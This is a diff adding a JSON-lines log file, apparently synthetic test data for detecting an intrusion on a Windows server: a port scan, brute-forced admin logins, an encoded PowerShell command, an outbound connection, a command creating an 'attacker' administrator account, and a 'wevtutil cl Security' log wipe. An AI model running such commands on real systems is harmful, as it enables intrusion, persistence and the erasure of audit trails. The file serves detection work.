@@ -1,0 +1,18 @@
+{"timestamp": "2026-10-29T10:00:00Z", "event_type": "network_connection", "source_ip": "45.33.32.156", "destination_ip": "192.168.1.50", "destination_port": 21}
+{"timestamp": "2026-10-29T10:00:02Z", "event_type": "network_connection", "source_ip": "45.33.32.156", "destination_ip": "192.168.1.50", "destination_port": 22}
+{"timestamp": "2026-10-29T10:00:03Z", "event_type": "network_connection", "source_ip": "45.33.32.156", "destination_ip": "192.168.1.50", "destination_port": 80}
+{"timestamp": "2026-10-29T10:00:05Z", "event_type": "network_connection", "source_ip": "45.33.32.156", "destination_ip": "192.168.1.50", "destination_port": 443}
+{"timestamp": "2026-10-29T10:00:06Z", "event_type": "network_connection", "source_ip": "45.33.32.156", "destination_ip": "192.168.1.50", "destination_port": 445}
+{"timestamp": "2026-10-29T10:00:08Z", "event_type": "network_connection", "source_ip": "45.33.32.156", "destination_ip": "192.168.1.50", "destination_port": 3389}
+{"timestamp": "2026-10-29T10:00:10Z", "event_type": "network_connection", "source_ip": "45.33.32.156", "destination_ip": "192.168.1.50", "destination_port": 8080}
+{"timestamp": "2026-10-29T10:00:12Z", "event_type": "network_connection", "source_ip": "45.33.32.156", "destination_ip": "192.168.1.50", "destination_port": 8443}
+{"timestamp": "2026-10-29T10:02:00Z", "event_type": "auth_failure", "source_ip": "45.33.32.156", "user_id": "admin", "host_name": "WIN-SRV01"}
+{"timestamp": "2026-10-29T10:02:10Z", "event_type": "auth_failure", "source_ip": "45.33.32.156", "user_id": "admin", "host_name": "WIN-SRV01"}
+{"timestamp": "2026-10-29T10:02:20Z", "event_type": "auth_failure", "source_ip": "45.33.32.156", "user_id": "admin", "host_name": "WIN-SRV01"}
+{"timestamp": "2026-10-29T10:02:30Z", "event_type": "auth_failure", "source_ip": "45.33.32.156", "user_id": "admin", "host_name": "WIN-SRV01"}
+{"timestamp": "2026-10-29T10:02:40Z", "event_type": "auth_failure", "source_ip": "45.33.32.156", "user_id": "admin", "host_name": "WIN-SRV01"}
+{"timestamp": "2026-10-29T10:02:45Z", "event_type": "auth_success", "source_ip": "45.33.32.156", "user_id": "admin", "host_name": "WIN-SRV01"}
+{"timestamp": "2026-10-29T10:03:15Z", "event_type": "process_creation", "host_name": "WIN-SRV01", "user_id": "admin", "command_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABzAGUAcgB2AGUAcgAgAD0A..."}
+{"timestamp": "2026-10-29T10:04:00Z", "event_type": "network_connection", "host_name": "WIN-SRV01", "source_ip": "192.168.1.50", "destination_ip": "185.220.101.5", "destination_port": 443}
+{"timestamp": "2026-10-29T10:05:00Z", "event_type": "process_creation", "host_name": "WIN-SRV01", "user_id": "admin", "command_line": "net localgroup administrators attacker /add"}
+{"timestamp": "2026-10-29T10:06:00Z", "event_type": "process_creation", "host_name": "WIN-SRV01", "user_id": "attacker", "command_line": "wevtutil cl Security"}
